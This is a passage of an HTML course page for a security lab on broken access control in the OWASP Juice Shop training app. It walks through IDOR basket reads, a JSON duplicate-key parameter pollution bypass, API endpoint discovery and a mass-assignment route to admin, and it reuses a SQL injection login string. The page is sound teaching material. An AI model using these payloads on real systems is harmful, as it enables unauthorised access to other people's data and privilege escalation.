@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 05: Broken Access Control — CCY4202</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../assets/css/base.css" />
+  <link rel="stylesheet" href="../assets/css/layout.css" />
+  <link rel="stylesheet" href="../assets/css/components.css" />
+</head>
+<body data-nav-active="labs" data-active-lab="lab05" data-projector-qr>
+  <div data-site-nav></div>
+
+  <div class="page-wrapper">
+    <aside class="sidebar" id="site-sidebar">
+      <div id="sidebar-module-tree"></div>
+    </aside>
+    <div class="sidebar-backdrop"></div>
+
+    <main class="main-content">
+      <nav class="breadcrumbs" aria-label="Breadcrumb">
+        <a href="../index.html">Home</a>
+        <span class="breadcrumbs__separator">/</span>
+        <a href="../index.html">Labs</a>
+        <span class="breadcrumbs__separator">/</span>
+        <span>Module 01</span>
+        <span class="breadcrumbs__separator">/</span>
+        <span>Lab 05</span>
+      </nav>
+
+      <header class="lab-header">
+        <div class="lab-header__meta">
+          <span class="lab-badge lab-badge--time">⏱️ 60 Mins</span>
+          <span class="lab-badge lab-badge--difficulty">Intermediate</span>
+        </div>
+        <h1 class="lab-header__title">Lab 05: Broken Access Control</h1>
+        <p class="lab-header__lead">
+          In the last two labs you tricked a parser into running code it never meant to run. Today nothing breaks and no special characters are needed. You learn how pentesters map hidden API endpoints, spot which identifiers the server forgot to lock down, and escalate from a normal customer to a full administrator using requests that look completely legitimate.
+        </p>
+      </header>
+
+      <!-- Section 1: What Broken Access Control Really Is -->
+      <section>
+        <h2 id="what-bac-is">1. What Broken Access Control Really Is</h2>
+
+        <div class="callout callout--tip">
+          <span class="callout__icon">🏦</span>
+          <div class="callout__content">
+            <div class="callout__title">May 2019: 885 million mortgage documents exposed by changing one number in a URL</div>
+            <p style="margin:0 0 var(--space-2);">
+              First American Financial, one of the largest title-insurance companies in the US, emailed customers links to their mortgage closing records ending with a document number: <code>.../Document?docId=<strong>75849621</strong></code>. Subtract <code>1</code> from that number in the address bar, and the server returned a stranger's file: bank account numbers, tax records, Social Security numbers, and driver's license scans going back to 2003.
+            </p>
+            <p style="margin:0;font-size:var(--font-size-sm);color:var(--color-text-secondary);">
+              Roughly <strong>885 million documents</strong> sat open to anyone who could count backwards. Nobody injected SQL or JavaScript. The server simply never asked: <em>"Does document 75849620 belong to the person asking for it?"</em>
+            </p>
+          </div>
+        </div>
+
+        <p class="lab-lead" style="margin-top:var(--space-4);">
+          When you send a request to a server, two completely separate checks are supposed to happen. Developers and students mix their names up constantly: <strong>Authentication</strong> proves <em>who you are</em> (you logged in), while <strong>Authorization</strong> checks whether you are allowed to touch <em>that specific resource or action</em>. Broken access control is what happens when the server checks the first and skips the second.
+        </p>
+
+        <div class="diagram-card" style="margin-top:var(--space-3);">
+          <div class="diagram-card__title">
+            <span>TWO SEPARATE CHECKS · Why "Logged In" ≠ "Allowed"</span>
+            <span style="color:var(--color-accent);">OWASP Top 10 #1 (A01) &amp; API #1 (BOLA)</span>
+          </div>
+          <div class="comparison-grid" style="margin:0;">
+            <div class="comparison-card comparison-card--cyan">
+              <div class="comparison-card__header">
+                <h3 class="comparison-card__title">1. Authentication: "Who are you?"</h3>
+                <span class="comparison-badge" style="color:var(--color-cyan);">usually checked ✓</span>
+              </div>
+              <div class="terminal-window" data-no-copy style="margin:var(--space-2) 0;">
+                <div class="terminal-window__body"><pre><code>Authorization: Bearer eyJ0eXAiOiJKV1Qi...
+// Server verifies RSA signature:
+// "Valid token! You are User #3 (bender)." ✓</code></pre></div>
+              </div>
+              <p style="font-size:var(--font-size-xs);color:var(--color-text-secondary);margin:0;">
+                Apps get authentication right almost every time because login is the very first feature developers test.
+              </p>
+            </div>
+            <div class="comparison-card comparison-card--accent">
+              <div class="comparison-card__header">
+                <h3 class="comparison-card__title">2. Authorization: "Is this yours?"</h3>
+                <span class="comparison-badge" style="color:var(--color-accent);">often forgotten ✗</span>
+              </div>
+              <div class="terminal-window" data-no-copy style="margin:var(--space-2) 0;">
+                <div class="terminal-window__body"><pre><code>GET /rest/basket/1 HTTP/1.1
+// User #3 asks for Basket #1 (Admin's cart)
+// Server checks login ✓, skips owner check ✗</code></pre></div>
+              </div>
+              <p style="font-size:var(--font-size-xs);color:var(--color-text-secondary);margin:0;">
+                The server confirms you're logged in, fetches Basket #1 from the database, and hands it over without checking that Basket #1 belongs to User #3.
+              </p>
+            </div>
+          </div>
+
+          <div class="terminal-window" data-no-copy style="margin:var(--space-3) 0 0;">
+            <div class="terminal-window__header">
+              <span class="terminal-window__title">Juice Shop's actual backend code (lib/insecurity.js) · spot the naming mistake</span>
+            </div>
+            <div class="terminal-window__body"><pre><code>// The developer named the middleware "isAuthorized", but look at what it actually runs:
+const isAuthorized = () =&gt; expressJwt({ secret: publicKey });
+// ↑ expressJwt ONLY verifies that your JWT signature is valid (Authentication).
+//   It never checks your role or whether you own the ID in the URL (Authorization)!</code></pre></div>
+          </div>
+        </div>
+
+        <figure class="diagram-card" style="margin-top:var(--space-4);">
+          <div class="diagram-card__title">
+            <span>VERTICAL vs. HORIZONTAL ACCESS CONTROL</span>
+            <span style="color:var(--color-cyan);">PortSwigger Web Security Academy</span>
+          </div>
+          <div style="background:#ffffff;border-radius:var(--radius-sm);padding:var(--space-3);border:1px solid var(--color-border);">
+            <img src="../assets/img/lab05/portswigger-access-control.svg" alt="Diagram showing broken access control allowing an attacker to reach admin user deletion and other users' account balances" loading="lazy" style="width:100%;max-height:360px;object-fit:contain;display:block;margin:0 auto;" />
+          </div>
+          <figcaption style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin-top:var(--space-2);font-family:var(--font-mono);">
+            When the server skips authorization checks, a normal user can reach sideways into another customer's account (horizontal) or upward into admin powers (vertical).
+          </figcaption>
+        </figure>
+
+        <div class="prediction-prompt" style="margin-top:var(--space-4);">
+          <div class="prediction-prompt__question">🤔 You are logged into Juice Shop as a normal customer (<code>User #3</code>, <code>Basket #3</code>). Name two things on the site you shouldn't be allowed to touch: one that belongs to another customer at your same rank, and one that belongs to an administrator above you.</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            <p style="margin:0;">Those are the two directions of Broken Access Control: <strong>Horizontal escalation</strong> is reading or modifying another peer's data at your own rank (like Basket #1 or #2). <strong>Vertical escalation</strong> is reaching functions or tables reserved for a higher role (like dumping the admin user list or registering yourself as an admin). Next, let's look at how a pentester actually discovers those targets without guessing.</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 2: The Hacker Mindset: How Do We Discover Hidden IDs, Endpoints & Fields? -->
+      <section>
+        <h2 id="hacker-mindset">2. The Hacker Mindset: How Pentesters Discover Hidden IDs, Endpoints &amp; Fields</h2>
+        <p class="lab-lead">
+          Beginners think pentesters magically know secret URLs like <code>/api/Users</code> or secret JSON fields like <code>"role": "admin"</code>. In reality, we never guess in the dark. Every attack in this lab comes from a repeatable <strong>4-step discovery loop</strong>:
+        </p>
+
+        <div class="diagram-card" style="margin-bottom:var(--space-4);">
+          <div class="diagram-card__title">
+            <span>THE PENTESTER'S DISCOVERY LOOP · How Every Clue Feeds the Next Attack</span>
+            <span style="color:var(--color-cyan);">Zero blind guessing</span>
+          </div>
+          <svg class="diagram-svg" viewBox="0 0 880 315" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Four-stage pentester discovery loop showing how normal traffic, JS bundle recon, and GET responses reveal every attack vector">
+            <defs>
+              <marker id="arr-cyan" viewBox="0 0 10 10" refX="7" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                <path d="M 0 1 L 8 5 L 0 9 z" fill="var(--color-cyan)" />
+              </marker>
+              <marker id="arr-accent" viewBox="0 0 10 10" refX="7" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                <path d="M 0 1 L 8 5 L 0 9 z" fill="var(--color-accent)" />
+              </marker>
+              <marker id="arr-warn" viewBox="0 0 10 10" refX="7" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+                <path d="M 0 1 L 8 5 L 0 9 z" fill="var(--color-warn)" />
+              </marker>
+            </defs>
+
+            <!-- Row 1: Clue 1 & 2 (Horizontal Read -> Write) -->
+            <rect x="10" y="14" width="165" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-cyan)" stroke-width="1.5" />
+            <text x="92" y="38" fill="var(--color-cyan)" font-family="var(--font-mono)" font-size="11" font-weight="700" text-anchor="middle">1. WATCH NORMAL TRAFFIC</text>
+            <text x="92" y="56" fill="var(--color-text-primary)" font-family="var(--font-sans)" font-size="10" text-anchor="middle">Click "Your Basket" &amp; "Add"</text>
+            <text x="92" y="73" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="9.5" text-anchor="middle">DevTools → Network (XHR)</text>
+
+            <line x1="175" y1="52" x2="208" y2="52" stroke="var(--color-cyan)" stroke-width="2" marker-end="url(#arr-cyan)" />
+
+            <rect x="213" y="14" width="210" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-border)" stroke-width="1.5" />
+            <text x="318" y="38" fill="var(--color-text-primary)" font-family="var(--font-sans)" font-size="11" font-weight="600" text-anchor="middle">Reveals Basket Read &amp; Write</text>
+            <text x="318" y="57" fill="var(--color-cyan)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">GET /rest/basket/3 (bid=3)</text>
+            <text x="318" y="74" fill="var(--color-cyan)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">POST /api/BasketItems</text>
+
+            <line x1="423" y1="52" x2="456" y2="52" stroke="var(--color-cyan)" stroke-width="2" marker-end="url(#arr-cyan)" />
+
+            <rect x="461" y="14" width="195" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-border)" stroke-width="1.5" />
+            <text x="558" y="38" fill="var(--color-text-primary)" font-family="var(--font-sans)" font-size="11" font-weight="600" text-anchor="middle">Swap ID (3 → 1) &amp; Duplicate</text>
+            <text x="558" y="57" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">Read: GET /rest/basket/1</text>
+            <text x="558" y="74" fill="var(--color-warn)" font-family="var(--font-mono)" font-size="9.5" text-anchor="middle">Write: {"BasketId":3,"BasketId":2}</text>
+
+            <line x1="656" y1="52" x2="689" y2="52" stroke="var(--color-cyan)" stroke-width="2" marker-end="url(#arr-cyan)" />
+
+            <rect x="694" y="14" width="176" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-cyan)" stroke-width="1.5" />
+            <text x="782" y="42" fill="var(--color-cyan)" font-family="var(--font-sans)" font-size="11" font-weight="700" text-anchor="middle">Steps 1 &amp; 2 Complete</text>
+            <text x="782" y="62" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="9.5" text-anchor="middle">Read &amp; Write any cart</text>
+
+            <!-- Row 2: Clue 3 (Mine main.js & Flip Verb) -->
+            <rect x="10" y="116" width="165" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-accent)" stroke-width="1.5" />
+            <text x="92" y="140" fill="var(--color-accent)" font-family="var(--font-mono)" font-size="11" font-weight="700" text-anchor="middle">2. MINE SPA BUNDLE</text>
+            <text x="92" y="158" fill="var(--color-text-primary)" font-family="var(--font-sans)" font-size="10" text-anchor="middle">Scan downloaded main.js</text>
+            <text x="92" y="175" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="9.5" text-anchor="middle">+ flip POST → GET verb</text>
+
+            <line x1="175" y1="154" x2="208" y2="154" stroke="var(--color-accent)" stroke-width="2" marker-end="url(#arr-accent)" />
+
+            <rect x="213" y="116" width="210" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-border)" stroke-width="1.5" />
+            <text x="318" y="140" fill="var(--color-text-primary)" font-family="var(--font-sans)" font-size="11" font-weight="600" text-anchor="middle">Exposes Hidden Admin API</text>
+            <text x="318" y="159" fill="var(--color-accent)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">/#/administration (UI route)</text>
+            <text x="318" y="176" fill="var(--color-accent)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">GET /api/Users (REST API)</text>
+
+            <line x1="423" y1="154" x2="456" y2="154" stroke="var(--color-accent)" stroke-width="2" marker-end="url(#arr-accent)" />
+
+            <rect x="461" y="116" width="195" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-border)" stroke-width="1.5" />
+            <text x="558" y="140" fill="var(--color-text-primary)" font-family="var(--font-sans)" font-size="11" font-weight="600" text-anchor="middle">Call API Directly (Skip UI)</text>
+            <text x="558" y="159" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">Dumps all 23+ accounts</text>
+            <text x="558" y="176" fill="var(--color-accent)" font-family="var(--font-mono)" font-size="9.5" text-anchor="middle">Reveals "role": "admin" field!</text>
+
+            <line x1="656" y1="154" x2="689" y2="154" stroke="var(--color-accent)" stroke-width="2" marker-end="url(#arr-accent)" />
+
+            <rect x="694" y="116" width="176" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-accent)" stroke-width="1.5" />
+            <text x="782" y="144" fill="var(--color-accent)" font-family="var(--font-sans)" font-size="11" font-weight="700" text-anchor="middle">Step 3 Complete</text>
+            <text x="782" y="164" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="9.5" text-anchor="middle">Full user table + schema</text>
+
+            <!-- Row 3: Clue 4 (Mirror Read Schema into Write Body) -->
+            <rect x="10" y="218" width="165" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-warn)" stroke-width="1.5" />
+            <text x="92" y="242" fill="var(--color-warn)" font-family="var(--font-mono)" font-size="11" font-weight="700" text-anchor="middle">3. MIRROR SCHEMA</text>
+            <text x="92" y="260" fill="var(--color-text-primary)" font-family="var(--font-sans)" font-size="10" text-anchor="middle">Copy field from Step 3 GET</text>
+            <text x="92" y="277" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="9.5" text-anchor="middle">into Step 4 POST body</text>
+
+            <line x1="175" y1="256" x2="208" y2="256" stroke="var(--color-warn)" stroke-width="2" marker-end="url(#arr-warn)" />
+
+            <rect x="213" y="218" width="210" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-border)" stroke-width="1.5" />
+            <text x="318" y="242" fill="var(--color-text-primary)" font-family="var(--font-sans)" font-size="11" font-weight="600" text-anchor="middle">Inject Privileged Property</text>
+            <text x="318" y="261" fill="var(--color-warn)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">POST /api/Users</text>
+            <text x="318" y="278" fill="var(--color-warn)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">+ "role": "admin"</text>
+
+            <line x1="423" y1="256" x2="456" y2="256" stroke="var(--color-warn)" stroke-width="2" marker-end="url(#arr-warn)" />
+
+            <rect x="461" y="218" width="195" height="76" rx="8" fill="var(--color-bg-alt)" stroke="var(--color-border)" stroke-width="1.5" />
+            <text x="558" y="242" fill="var(--color-text-primary)" font-family="var(--font-sans)" font-size="11" font-weight="600" text-anchor="middle">ORM Binds All Columns</text>
+            <text x="558" y="261" fill="var(--color-text-muted)" font-family="var(--font-mono)" font-size="10" text-anchor="middle">User.create(req.body)</text>
+            <text x="558" y="278" fill="var(--color-warn)" font-family="var(--font-mono)" font-size="9.5" text-anchor="middle">Mass Assignment (BOPLA)</text>
+
+            <line x1="656" y1="256" x2="689" y2="256" stroke="var(--color-warn)" stroke-width="2" marker-end="url(#arr-warn)" />
+
+            <rect x="694" y="218" width="176" height="76" rx="8" fill="var(--color-accent-soft)" stroke="var(--color-accent)" stroke-width="2" />
+            <text x="782" y="246" fill="var(--color-accent)" font-family="var(--font-sans)" font-size="11" font-weight="700" text-anchor="middle">Step 4: Full Admin!</text>
+            <text x="782" y="266" fill="var(--color-text-primary)" font-family="var(--font-mono)" font-size="9.5" text-anchor="middle">Opens /#/administration</text>
+          </svg>
+        </div>
+
+        <h3 id="where-ids-live">Clue #1: Compare what the server signed (<code>localStorage.token</code>) vs. what sits unsigned (<code>sessionStorage.bid</code>)</h3>
+        <p class="lab-lead">
+          Whenever you log into a modern web app, your first move is to open DevTools (<kbd>F12</kbd>) and inspect <strong>Application → Storage</strong> (or run two lines in the Console) to see where your identity and object IDs live:
+        </p>
+
+        <div class="terminal-window" data-no-copy>
+          <div class="terminal-window__header">
+            <span class="terminal-window__title">DevTools Console · logged into Juice Shop as bender@juice-sh.op</span>
+          </div>
+          <div class="terminal-window__body"><pre><code>&gt; sessionStorage.getItem('bid')
+'3'
+
+&gt; JSON.parse(atob(localStorage.token.split('.')[1])).data
+{ id: 3, email: 'bender@juice-sh.op', role: 'customer', deluxeToken: '', ... }</code></pre></div>
+        </div>
+
+        <div class="comparison-grid" style="margin-top:var(--space-3);">
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">Signed JWT Identity (<code>localStorage.token</code>)</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);">RSA-signed by server</span>
+            </div>
+            <ul class="comparison-list">
+              <li><span class="comparison-icon">🔏</span> Your JWT is three Base64 strings separated by dots (<code>header.payload.signature</code>). Its middle payload says you are <code>id: 3</code> with <code>role: 'customer'</code>.</li>
+              <li><span class="comparison-icon">🛡️</span> Because the 3rd part is signed with the server's private RSA key, modifying <code>id: 3</code> inside the JWT invalidates the signature and the server rejects the token with <code>401</code>.</li>
+            </ul>
+          </div>
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">Unsigned Object IDs (<code>sessionStorage.bid</code> &amp; URLs)</h3>
+              <span class="comparison-badge" style="color:var(--color-accent);">controlled by you</span>
+            </div>
+            <ul class="comparison-list">
+              <li><span class="comparison-icon">🛒</span> Notice that your active shopping cart number (<code>'3'</code>) is stored separately in <code>sessionStorage.bid</code>, outside the signed JWT!</li>
+              <li><span class="comparison-icon">💥</span> When you click <strong>Your Basket</strong>, Angular reads <code>sessionStorage.bid</code> and calls <code>GET /rest/basket/3</code>. Anything outside the JWT signature can be changed freely by you!</li>
+            </ul>
+          </div>
+        </div>
+
+        <h3 id="how-we-find-endpoints" style="margin-top:var(--space-4);">Clue #2: How do we know hidden endpoints like <code>/api/Users</code> or <code>/#/administration</code> exist?</h3>
+        <p class="lab-lead">
+          When you log in as a normal customer, there is no "Administration" button in the navbar. So how does a pentester discover <code>/api/Users</code> and <code>/#/administration</code> in 10 seconds? Two techniques give them away immediately:
+        </p>
+
+        <div class="comparison-grid">
+          <div class="comparison-card comparison-card--cyan">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">Technique A: Mine the Downloaded <code>main.js</code> Bundle</h3>
+              <span class="comparison-badge" style="color:var(--color-cyan);">SPA Recon</span>
+            </div>
+            <p style="font-size:var(--font-size-xs);color:var(--color-text-secondary);margin:0 0 var(--space-2);">
+              Single-Page Apps (Angular, React, Vue) bundle the <strong>entire frontend route map and every API URL</strong> into <code>main.js</code> and ship it to every browser, even unauthenticated visitors!
+            </p>
+            <div class="terminal-window" data-no-copy style="margin:0;">
+              <div class="terminal-window__body"><pre><code>// Extracted from http://localhost:3000/main.js:
+path:`administration`, canActivate:[AdminGuard]
+'/api/BasketItems', '/api/Cards', '/api/Users',
+'/rest/admin', '/rest/basket'</code></pre></div>
+            </div>
+          </div>
+
+          <div class="comparison-card comparison-card--accent">
+            <div class="comparison-card__header">
+              <h3 class="comparison-card__title">Technique B: REST Verb Flipping &amp; Schema Mirroring</h3>
+              <span class="comparison-badge" style="color:var(--color-accent);">Traffic Inference</span>
+            </div>
+            <p style="font-size:var(--font-size-xs);color:var(--color-text-secondary);margin:0 0 var(--space-2);">
+              When you register a new account on <code>/#/register</code>, the Network tab shows <code>POST /api/Users</code>. In REST APIs, if <code>POST /api/Users</code> creates one user, what does <code>GET /api/Users</code> do?
+            </p>
+            <div class="terminal-window" data-no-copy style="margin:0;">
+              <div class="terminal-window__body"><pre><code>// 1. Signup fires:   POST /api/Users (creates your user)
+// 2. Flip verb:      GET  /api/Users (dumps all users!)
+// 3. Read response:  sees {"role": "admin"} on User #1
+// 4. Mirror to POST: send {"role": "admin"} on signup!</code></pre></div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Section 3: Horizontal Access Control (Basket Read IDOR -> Basket Write HPP Bypass) -->
+      <section>
+        <h2 id="idor-live">3. Horizontal Escalation: Read &amp; Write Other Users' Baskets</h2>
+        <p class="lab-lead">
+          Let's put the mindset into action on **Baskets** first. When an endpoint uses a client-supplied ID (like <code>/rest/basket/3</code>) to fetch a database row without verifying that the row belongs to the caller, the bug is called an <strong>Insecure Direct Object Reference (IDOR)</strong>, or <strong>Broken Object Level Authorization (BOLA)</strong>. We will first hijack **Read** access (Step 1), and then bypass a security guard to hijack **Write** access (Step 2).
+        </p>
+
+        <div class="target-launcher" data-target-slug="juice-shop">
+          <div class="target-launcher__header">
+            <div class="target-launcher__title-group">
+              <span class="target-launcher__icon">🧃</span>
+              <div>
+                <h3 class="target-launcher__title">OWASP Juice Shop</h3>
+                <div class="target-launcher__platform">Same container as Labs 02–04. If it's still running, skip straight to the browser.</div>
+              </div>
+            </div>
+            <span class="target-launcher__badge">🎯 Launch Target</span>
+          </div>
+          <div class="target-launcher__body">
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">Start the container (skip if already running)</span>
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
+                <div class="terminal-window__header"><span class="terminal-window__title">bash · start Juice Shop</span></div>
+                <div class="terminal-window__body"><pre><code>docker run --rm -d --name juice -p 3000:3000 bkimminich/juice-shop</code></pre></div>
+              </div>
+            </div>
+            <div class="target-launcher__step">
+              <span class="target-launcher__step-label">Open it and log into any customer account</span>
+              <a class="target-launcher__url" href="http://localhost:3000" target="_blank" rel="noopener">http://localhost:3000</a>
+            </div>
+          </div>
+          <div class="target-launcher__footer">
+            <span>Tip: Log in as <code>bender@juice-sh.op</code> using <code>' OR 1=1 LIMIT 1 OFFSET 2--</code> from Lab 03, or register your own customer account.</span>
+            <a class="target-launcher__catalog-link" href="../tools.html#juice-shop">→ setup card</a>
+          </div>
+        </div>
+
+        <div class="bento-card" style="margin-top:var(--space-4);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
+            <strong style="color:var(--color-accent);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 1 · Observe Normal Basket Traffic, Then Hijack Basket #1 (Read IDOR)</strong>
+            <span class="comparison-badge" style="color:var(--color-accent);">Horizontal Read</span>
+          </div>
+          <ol style="font-size:var(--font-size-sm);color:var(--color-text-secondary);padding-left:var(--space-4);margin:0 0 var(--space-3);display:flex;flex-direction:column;gap:var(--space-2);">
+            <li><strong>Acquire the endpoint from normal traffic</strong>: Log in as a customer (such as <code>bender@juice-sh.op</code>, whose basket ID is <code>3</code>), open DevTools (<kbd>F12</kbd>) → <strong>Network</strong> → filter by <strong>Fetch/XHR</strong>, and click <strong>Your Basket</strong>. You will see the browser request <code>GET /rest/basket/3</code> using the number stored in <code>sessionStorage.bid</code>.</li>
+            <li><strong>Exploit it right inside the UI</strong>: Switch to the DevTools <strong>Console</strong>, point <code>sessionStorage.bid</code> at Basket <code>1</code> (the Admin's pre-seeded cart), and press <kbd>Enter</kbd>:
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
+                <div class="terminal-window__header"><span class="terminal-window__title">DevTools Console · point your UI at Basket 1</span></div>
+                <div class="terminal-window__body"><pre><code>sessionStorage.bid = 1</code></pre></div>
+              </div>
+            </li>
+            <li>Reload the page (<kbd>F5</kbd>) or click <strong>Your Basket</strong> again. Look at the heading: it still says <code>Your Basket (bender@juice-sh.op)</code>, but the items inside belong to the <strong>Admin's Basket #1</strong>!</li>
+            <li><strong>Inspect the raw API response</strong> (in <strong>Burp Repeater</strong> by sending <code>GET /rest/basket/1</code>, or by running this one-liner in your Console):
+              <div class="terminal-window" style="margin:var(--space-1) 0 0;">
+                <div class="terminal-window__header"><span class="terminal-window__title">DevTools Console · fetch Basket 1 directly from the API</span></div>
+                <div class="terminal-window__body"><pre><code>fetch('/rest/basket/1', {headers:{Authorization:'Bearer '+localStorage.token}}).then(r=&gt;r.json()).then(console.log)</code></pre></div>
+              </div>
+            </li>
+          </ol>
+
+          <div class="terminal-window" data-no-copy style="margin:0 0 var(--space-3);">
+            <div class="terminal-window__header"><span class="terminal-window__title">Burp Repeater / API Response · Customer #3 reads Admin Basket #1</span></div>
+            <div class="terminal-window__body"><pre><code>GET /rest/basket/1 HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...   // your normal customer token
+
+HTTP/1.1 200 OK
+{"status":"success","data":{
+  "id": 1,
+  "UserId": 1,                                                  // belongs to User #1 (Admin), not you!
+  "Products": [
+    { "id": 1, "name": "Apple Juice (1000ml)",   "BasketItem": { "quantity": 2 } },
+    { "id": 2, "name": "Orange Juice (1000ml)",  "BasketItem": { "quantity": 3 } },
+    { "id": 3, "name": "Eggfruit Juice (500ml)", "BasketItem": { "quantity": 1 } }
+  ]
+}}</code></pre></div>
+          </div>
+
+          <figure style="margin:var(--space-2) 0 0;">
+            <img src="../assets/img/lab05/juiceshop-basket-idor.png" alt="Juice Shop Your Basket page logged in as bender@juice-sh.op displaying the Admin's 6 items from Basket 1" loading="lazy" style="width:100%;border:1px solid var(--color-border);border-radius:var(--radius-md);display:block;" />
+            <figcaption style="font-size:var(--font-size-xs);color:var(--color-text-muted);margin-top:var(--space-2);font-family:var(--font-mono);">
+              Notice the mismatch: the page header says <code>Your Basket (bender@juice-sh.op)</code>, while the table displays the Admin's 6 items from Basket <code>1</code> because <code>GET /rest/basket/1</code> never checks basket ownership.
+            </figcaption>
+          </figure>
+
+          <details class="thought-accordion" style="margin-top:var(--space-3);">
+            <summary>Got a 401 or want to restore your own basket number?</summary>
+            <div class="thought-accordion__content">
+              <p style="margin:0 0 var(--space-2);">If Burp Repeater returns <code>401 Unauthorized</code>, make sure the <code>Authorization: Bearer eyJ...</code> header from a logged-in request is present in Repeater.</p>
+              <p style="margin:0;">After inspecting Basket <code>1</code> and <code>2</code>, set <code>sessionStorage.bid = 3</code> (if logged in as Bender) so your browser UI is back on your own cart.</p>
+            </div>
+          </details>
+        </div>
+
+        <div class="prediction-prompt" style="margin-top:var(--space-4);">
+          <div class="prediction-prompt__question">🤔 You just proved you can <strong>READ</strong> anyone's basket. A real pentester never stops at Read: they immediately test <strong>WRITE</strong>! When you click "Add to Basket" on a product, the Network tab shows <code>POST /api/BasketItems</code> sending <code>{"ProductId":6,"BasketId":"3","quantity":1}</code>. If you change <code>"BasketId"</code> to <code>2</code>, the server blocks you with <code>401 Invalid BasketId</code>! Instead of giving up, how can you craft the JSON body so the security guard sees <strong>your</strong> <code>BasketId: 3</code>, while the database writes into <strong>victim</strong> <code>BasketId: 2</code>?</div>
+          <div class="prediction-prompt__input-group">
+            <input type="text" class="prediction-prompt__input" placeholder="Your guess…" />
+            <button type="button" class="prediction-prompt__btn">Reveal</button>
+          </div>
+          <div class="prediction-prompt__reveal" hidden>
+            <span class="prediction-prompt__reveal-label">Answer</span>
+            <p style="margin:0;">Put <code>"BasketId"</code> in the JSON body <strong>twice</strong>: your own basket number first, and the victim's basket number second (<code>{"BasketId": 3, "ProductId": 6, "BasketId": 2, "quantity": 1}</code>). The validation guard checks the <strong>first</strong> key (<code>basketIds[0]</code>, which matches your token and passes), while the database insert uses the <strong>last</strong> key (<code>basketIds[basketIds.length - 1]</code>, which is <code>2</code>). That's <strong>HTTP Parameter Pollution (HPP)</strong> in JSON!</p>
+          </div>
+        </div>
+
+        <div class="bento-card" style="margin-top:var(--space-4);border-left:3px solid var(--color-warn);">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:var(--space-2);">
+            <strong style="color:var(--color-warn);font-family:var(--font-mono);font-size:var(--font-size-sm);">Step 2 · Beat the Write Guard with JSON Parameter Pollution (POST /api/BasketItems)</strong>
+            <span class="comparison-badge" style="color:var(--color-warn);">Horizontal Write Bypass</span>
+          </div>
+          <p style="font-size:var(--font-size-sm);color:var(--color-text-secondary);margin:0 0 var(--space-2);">
+            <strong>How we found this</strong>: Clicking <strong>Add to Basket</strong> on the homepage while watching <strong>Network → Fetch/XHR</strong> reveals <code>POST /api/BasketItems</code>. Changing <code>"BasketId"</code> directly to <code>2</code> returns <code>401 Invalid BasketId</code> because the developer added a check in <code>routes/basketItems.js</code>. Look at why duplicating the key defeats that check:
+          </p>
+          <div class="terminal-window" data-no-copy style="margin:0 0 var(--space-2);">
+            <div class="terminal-window__header"><span class="terminal-window__title">Juice Shop server code (routes/basketItems.js) · First-Key vs. Last-Key Split</span></div>
+            <div class="terminal-window__body"><pre><code>if (Number(user.bid) != Number(basketIds[0])) {      // 1. Auth guard checks the FIRST BasketId
+  res.status(401).send("{'error' : 'Invalid BasketId'}");
+} else {
+  const basketItem = {
+    BasketId:  basketIds[basketIds.length - 1],      // 2. Database writes the LAST BasketId!
+    ProductId: productIds[productIds.length - 1],
+    quantity:  quantities[quantities.length - 1]
+  };</code></pre></div>
+          </div>
